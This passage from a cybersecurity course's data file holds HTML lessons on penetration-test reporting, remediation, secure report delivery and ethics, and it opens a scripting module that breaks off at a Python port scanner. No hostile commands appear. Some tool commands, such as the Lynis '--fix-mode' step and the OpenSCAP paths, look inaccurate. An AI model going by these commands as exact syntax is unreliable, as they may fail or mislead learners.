                ⚠️ <span class="font-semibold">Note:</span> Tools help structure and manage evidence effectively.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: CherryTree (Structured Documentation)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Launch CherryTree</span>
                    <code class="text-green-400 block font-mono text-sm">cherrytree</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Create node for each vulnerability</span>
                    <code class="text-green-400 block font-mono text-sm">Right-click → Add Node</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Add description and steps</span>
                    <code class="text-gray-400 block font-mono text-sm">Type text in editor pane</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Attach screenshot / evidence</span>
                    <code class="text-green-400 block font-mono text-sm">Node → Insert → Image</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Export report</span>
                    <code class="text-green-400 block font-mono text-sm">File → Export → PDF / HTML</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Dradis Framework (Collaboration & Evidence Management)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Start Dradis service</span>
                    <code class="text-green-400 block font-mono text-sm">dradis</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Access web interface</span>
                    <code class="text-green-400 block font-mono text-sm">http://127.0.0.1:3000</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Create new project</span>
                    <code class="text-green-400 block font-mono text-sm">Projects → New Project</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Add vulnerabilities</span>
                    <code class="text-green-400 block font-mono text-sm">Nodes → Add Finding → Fill Title, Description, Evidence</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Export full report</span>
                    <code class="text-green-400 block font-mono text-sm">Reports → Generate → PDF / HTML</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 mb-4">
              Documentation is as important as finding the vulnerability. Auditors, developers, and management rely on this section to understand, verify, and fix issues.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium border-t border-[#333] pt-4">
              Key Takeaway: A vulnerability without proper documentation is like finding a needle in the dark and throwing it away. Evidence ensures trust, clarity, and remediation.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Remediation Recommendations',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Remediation Recommendations</h2>
            <p class="mb-4 text-gray-300">
              Remediation recommendations are the actionable solutions provided to fix vulnerabilities discovered during a penetration test. The goal is to help the client reduce risk, prevent exploitation, and improve overall security posture.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Key Principles for Recommendations</h3>
            <div class="space-y-4">
              <div>
                <h4 class="text-sm font-semibold text-white">Specificity</h4>
                <p class="text-gray-400 text-sm">Avoid vague statements. Suggest exact fixes, patches, or configuration changes.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Prioritization</h4>
                <p class="text-gray-400 text-sm">Focus on high-risk issues first, followed by medium and low-risk issues.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Feasibility</h4>
                <p class="text-gray-400 text-sm">Recommendations must be realistic for the organization to implement.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Clarity</h4>
                <p class="text-gray-400 text-sm">Avoid technical jargon for business readers. Use diagrams or tables if needed.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Actionable Steps</h4>
                <p class="text-gray-400 text-sm">Include commands, configuration snippets, or links to resources.</p>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Examples of Recommendations</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Patch software to the latest secure version</li>
              <li>Disable or restrict SUID binaries</li>
              <li>Enforce strong password policies</li>
              <li>Implement multi-factor authentication</li>
              <li>Regularly rotate keys and credentials</li>
              <li>Apply least-privilege principles</li>
            </ul>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Tools & Methods to Suggest Fixes)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Note:</span> Tools help identify missing patches and hardening steps.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: OpenSCAP (Compliance & Patch Verification)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Install OpenSCAP</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt install openscap-utils</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Scan system for vulnerabilities</span>
                    <code class="text-green-400 block font-mono text-sm">oscap oval eval --results results.xml --report report.html /usr/share/openscap/scap-yaml/ssg-ubuntu2004-ds.xml</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Generate remediation report</span>
                    <code class="text-green-400 block font-mono text-sm">oscap xccdf generate fix --profile xccdf_org.ssgproject.content_profile_standard --results results.xml</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Review recommended patches</span>
                    <code class="text-green-400 block font-mono text-sm">cat report.html</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Apply updates</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt update && sudo apt upgrade -y</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Lynis (System Hardening Recommendations)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Install Lynis</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt install lynis</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Run system audit</span>
                    <code class="text-green-400 block font-mono text-sm">sudo lynis audit system</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Review warnings and suggestions</span>
                    <code class="text-green-400 block font-mono text-sm">sudo lynis show report</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Follow remediation steps suggested</span>
                    <code class="text-green-400 block font-mono text-sm">sudo lynis audit system --fix-mode</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Verify compliance</span>
                    <code class="text-green-400 block font-mono text-sm">sudo lynis show details</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 mb-4">
              Effective recommendations are the bridge between finding and fixing. Clients value clear, actionable guidance more than technical details.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium border-t border-[#333] pt-4">
              Key Takeaway: Recommendations are the “how to fix it” section. A strong pentest report not only shows problems but shows solutions.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Communication with Clients During Pentesting',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Communication with Clients During Pentesting</h2>
            <p class="mb-4 text-gray-300">
              Client communication is a critical part of penetration testing. Proper communication ensures the testing process is smooth, professional, and aligned with business expectations. Poor communication can cause misunderstandings about scope, unnecessary panic, or legal issues.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Objectives of Client Communication</h3>
            <div class="space-y-4">
              <div>
                <h4 class="text-sm font-semibold text-white">Set Expectations</h4>
                <p class="text-gray-400 text-sm">Explain the scope, goals, limitations, timelines, and deliverables.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Regular Updates</h4>
                <p class="text-gray-400 text-sm">Notify clients about major findings via agreed channels (email, ticketing, meetings) without exposing sensitive details.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Clarify Risks</h4>
                <p class="text-gray-400 text-sm">Translate technical findings into business impact. Avoid technical overload.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Report Review</h4>
                <p class="text-gray-400 text-sm">Walk through reports with stakeholders. Answer questions and provide context.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Ethical Boundaries</h4>
                <p class="text-gray-400 text-sm">Never test outside agreed scope. Respect confidentiality at all times.</p>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Best Practices</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Use professional and polite language</li>
              <li>Keep a log of communications for accountability</li>
              <li>Escalate critical issues immediately</li>
              <li>Avoid jargon for executives; use technical details only for IT staff</li>
              <li>Provide remediation guidance along with findings</li>
            </ul>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Tools & Channels for Communication)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Note:</span> Secure communication is paramount.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: Secure Email (PGP/GPG Encryption)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Install GPG</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt install gnupg</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Generate key pair</span>
                    <code class="text-green-400 block font-mono text-sm">gpg --full-generate-key</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Export public key</span>
                    <code class="text-green-400 block font-mono text-sm">gpg --export -a "Your Name" > publickey.asc</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Encrypt report</span>
                    <code class="text-green-400 block font-mono text-sm">gpg --encrypt --recipient "Client Name" report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Send encrypted file via email</span>
                    <code class="text-gray-400 block font-mono text-sm">Attach report.pdf.gpg in email client</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Collaboration Platforms (Teams / Slack / Jira)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Create project workspace</span>
                    <code class="text-gray-400 block font-mono text-sm">Example in Jira: Create Project → Security Pentest</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Add team members and clients</span>
                    <code class="text-gray-400 block font-mono text-sm">Invite stakeholders to the workspace</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Post updates for vulnerabilities</span>
                    <code class="text-gray-400 block font-mono text-sm">Ticket → Description, Severity, Evidence</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Track remediation progress</span>
                    <code class="text-gray-400 block font-mono text-sm">Move ticket from "Open" → "In Progress" → "Resolved"</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Document all interactions</span>
                    <code class="text-gray-400 block font-mono text-sm">Use internal comments for context & audit trail</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 mb-4">
              Transparency builds trust. Regular updates reduce panic and confusion. Proper communication protects both client and tester legally.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium border-t border-[#333] pt-4">
              Key Takeaway: A penetration test isn’t just about hacking — it’s also about guiding and educating the client safely and professionally.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Report Delivery Best Practices',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Report Delivery Best Practices</h2>
            <p class="mb-4 text-gray-300">
              Delivering a penetration testing report is more than just sending a PDF. Proper delivery ensures that the client understands, trusts, and acts on your findings. A poorly delivered report can undermine the value of the pentest, even if the testing was thorough.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Key Principles of Report Delivery</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h4 class="text-white font-medium mb-1">Timing</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Deliver promptly after testing</li>
                  <li>Avoid delays that make findings obsolete</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Format</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Provide multiple formats (PDF, Word, HTML)</li>
                  <li>Include executive summary separately for management</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Presentation</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Walkthrough with the client (in-person or virtual)</li>
                  <li>Highlight critical findings first</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Clarity</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Use visual aids (charts, tables, graphs)</li>
                  <li>Avoid cluttered technical logs in the main report</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Follow-Up</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Schedule a session to answer questions</li>
                  <li>Ensure remediation guidance is understood</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Confidentiality</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Use secure channels for transmission</li>
                  <li>Encrypt reports if sent via email</li>
                </ul>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Common Mistakes in Report Delivery</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Sending reports without explanation</li>
              <li>Overloading the client with technical jargon</li>
              <li>Not highlighting priority issues</li>
              <li>Forgetting secure transmission</li>
            </ul>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Tools for Secure & Professional Delivery)</h3>
            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: Encrypted PDF Delivery</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Install qpdf for PDF encryption</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt install qpdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Encrypt PDF with password</span>
                    <code class="text-green-400 block font-mono text-sm">qpdf --encrypt &lt;password&gt; &lt;password&gt; 256 -- input_report.pdf output_report_encrypted.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Verify encryption</span>
                    <code class="text-green-400 block font-mono text-sm">qpdf --show-encryption output_report_encrypted.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Send via secure email</span>
                    <code class="text-gray-400 block font-mono text-sm">Attach output_report_encrypted.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Share password</span>
                    <code class="text-gray-400 block font-mono text-sm">Share password through a separate secure channel</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Secure File Sharing Platforms (Nextcloud / OwnCloud / SFTP)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Upload report to secure server</span>
                    <code class="text-green-400 block font-mono text-sm">scp report.pdf user@secure-server:/reports/</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Set strict permissions</span>
                    <code class="text-green-400 block font-mono text-sm">chmod 600 /reports/report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Share secure download link</span>
                    <code class="text-gray-400 block font-mono text-sm">Generate secure link from platform</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Authentication</span>
                    <code class="text-gray-400 block font-mono text-sm">Require client authentication before download</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Auditing</span>
                    <code class="text-gray-400 block font-mono text-sm">Track access and download logs</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 text-sm">
              The delivery process reinforces professionalism: Clients see you as reliable and thorough. Proper encryption protects sensitive findings. Walkthroughs improve understanding and action.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm">
              Report delivery is the final step in a pentest engagement, and it’s as important as testing itself.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Ethics & Confidentiality',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Ethics & Confidentiality in Reporting</h2>
            <p class="mb-4 text-gray-300">
              Ethics and confidentiality are the cornerstones of professional cybersecurity work. A penetration test involves sensitive information — mishandling it can cause legal, financial, and reputational damage. Even the best technical findings are worthless without ethical handling.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Key Ethical Principles</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h4 class="text-white font-medium mb-1">Authorized Testing Only</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Always have written permission</li>
                  <li>Never test outside the agreed scope</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Confidentiality</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Client data, credentials, and vulnerabilities must not be shared</li>
                  <li>Use encryption and secure channels for reports</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Integrity & Honesty</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Do not fabricate findings</li>
                  <li>Avoid exaggerating impact</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Responsible Disclosure</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Share findings only with authorized personnel</li>
                  <li>Avoid public disclosure without client consent</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Professional Conduct</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Respect privacy</li>
                  <li>Communicate professionally</li>
                  <li>Document all actions</li>
                </ul>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Legal & Compliance Considerations</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h4 class="text-white font-medium mb-1">Penetration testers may be bound by:</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>NDA (Non-Disclosure Agreement)</li>
                  <li>ISO/IEC standards (27001, 27002)</li>
                  <li>Industry regulations (PCI-DSS, HIPAA, GDPR)</li>
                </ul>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Misconduct can lead to:</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Termination of contracts</li>
                  <li>Legal penalties</li>
                  <li>Loss of professional reputation</li>
                </ul>
              </div>
            </div>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Tools for Maintaining Confidentiality)</h3>
            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: GPG / PGP Encryption</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Install GPG</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt install gnupg</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Generate personal key</span>
                    <code class="text-green-400 block font-mono text-sm">gpg --full-generate-key</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Encrypt report for client</span>
                    <code class="text-green-400 block font-mono text-sm">gpg --encrypt --recipient "Client Name" report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Decrypt report (client side)</span>
                    <code class="text-green-400 block font-mono text-sm">gpg --decrypt report.pdf.gpg &gt; report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Sign report digitally</span>
                    <code class="text-green-400 block font-mono text-sm">gpg --sign report.pdf</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Secure File Transfer (SFTP)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Connect to secure server</span>
                    <code class="text-green-400 block font-mono text-sm">sftp user@secure-server</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Upload report securely</span>
                    <code class="text-green-400 block font-mono text-sm">put report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Set file permissions</span>
                    <code class="text-green-400 block font-mono text-sm">chmod 600 report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Limit access to authorized client</span>
                    <code class="text-green-400 block font-mono text-sm">chown clientuser:clientuser report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Verify transfer and log</span>
                    <code class="text-green-400 block font-mono text-sm">ls -l report.pdf</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 text-sm">
              Ethics and confidentiality are non-negotiable: They protect the client, they protect the tester, and they maintain trust in the cybersecurity profession.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm">
              A penetration tester’s skills are only valuable when paired with ethical responsibility. Technical expertise without ethics can cause more harm than good.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Summary',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Summary – Reporting & Communication in Cyber Security</h2>
            <p class="mb-4 text-gray-300">
              Reporting and communication are the bridge between technical testing and actionable business improvement. A penetration test is not complete until the findings are clearly communicated and the client can act on them. Module 9 focused on how to structure, present, and deliver reports professionally and ethically.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Key Points Covered</h3>
            <div class="space-y-4">
              <div>
                <h4 class="text-white font-medium mb-1">Introduction to Security Reporting</h4>
                <p class="text-gray-400 text-sm">Purpose, importance, and audience</p>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Components of a Good Penetration Testing Report</h4>
                <p class="text-gray-400 text-sm">Cover page, executive summary, scope, methodology, findings, remediation</p>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Executive Summaries</h4>
                <p class="text-gray-400 text-sm">Concise, non-technical, visually clear summaries for management</p>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Documenting Vulnerabilities & Evidence</h4>
                <p class="text-gray-400 text-sm">Detailed, reproducible findings with proof</p>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Remediation Recommendations</h4>
                <p class="text-gray-400 text-sm">Clear, prioritized, actionable fixes</p>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Communication with Clients During Pentesting</h4>
                <p class="text-gray-400 text-sm">Set expectations, provide updates, clarify risks</p>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Report Delivery Best Practices</h4>
                <p class="text-gray-400 text-sm">Timely, secure, and professional delivery</p>
              </div>
              <div>
                <h4 class="text-white font-medium mb-1">Ethics & Confidentiality</h4>
                <p class="text-gray-400 text-sm">Authorized testing, responsible disclosure, legal compliance</p>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 text-sm mb-2">
              A report turns a technical penetration test into real business value. Clients rely on your clarity, honesty, and guidance, not just exploits.
            </p>
            <p class="text-gray-300 text-sm">
              Ethical and professional communication is as important as technical skills.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm mb-2">
              Hacking without reporting is incomplete. Reporting without ethics is dangerous.
            </p>
            <p class="text-gray-300 text-sm">
              The combination of technical findings, clear documentation, actionable recommendations, and ethical communication defines a professional penetration tester.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      }
    ]
  },
  {
    id: 'module-10',
    title: 'Module 10: Tools & Code Analysis',
    duration: '1 week',
    description: 'Enhance your toolkit with scripting and analysis of exploit code.',
    lessons: [
      {
        title: 'Introduction to Scripting for Cyber Security',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Introduction to Scripting for Cyber Security</h2>
            <p class="mb-4 text-gray-300">
              Scripting in cybersecurity is the use of programming or scripting languages to automate tasks, analyze data, and exploit vulnerabilities. It allows penetration testers, red teamers, and security analysts to:
            </p>
            <ul class="list-disc list-inside space-y-2 text-gray-300 mb-4">
              <li><span class="text-white font-medium">Automate repetitive tasks</span> – Run routine scans or tests without manual input.</li>
              <li><span class="text-white font-medium">Analyze large datasets quickly</span> – Parse logs or scan results efficiently.</li>
              <li><span class="text-white font-medium">Develop custom exploits or payloads</span> – Tailor attacks to specific targets.</li>
              <li><span class="text-white font-medium">Integrate multiple tools and workflows</span> – Chain tools together for complex operations.</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Why Scripting Matters</h3>
            <ul class="list-disc list-inside space-y-2 text-gray-300">
              <li>Manual testing is time-consuming and error-prone.</li>
              <li>Scripts improve efficiency and accuracy.</li>
              <li>Many tools (e.g., Metasploit, Nmap, SQLMap) support scripted automation.</li>
              <li><span class="text-blue-400">Python</span>, <span class="text-green-400">Bash</span>, and <span class="text-yellow-400">PowerShell</span> are the most common scripting languages in cybersecurity.</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Key Scripting Areas in Cyber Security</h3>
            <ul class="list-disc list-inside space-y-2 text-gray-300">
              <li><span class="text-white font-medium">Reconnaissance Automation</span> – Scan and gather data from networks or websites.</li>
              <li><span class="text-white font-medium">Vulnerability Analysis</span> – Automate testing of known vulnerabilities.</li>
              <li><span class="text-white font-medium">Exploit Development</span> – Write scripts to exploit specific flaws.</li>
              <li><span class="text-white font-medium">Post-Exploitation</span> – Automate privilege escalation, persistence, or lateral movement.</li>
              <li><span class="text-white font-medium">Reporting & Logging</span> – Generate automated reports or logs for findings.</li>
            </ul>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Scripting Tools & Commands)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-white font-medium mb-3">Tool 1: Python (Automation & Exploitation)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Run Python interactive shell</span>
                  <code class="text-blue-400 block font-mono text-sm">python3</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Import networking module</span>
                  <code class="text-blue-400 block font-mono text-sm">import socket</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Create a simple port scanner</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
target = "192.168.1.10"
for port in range(20, 1025):
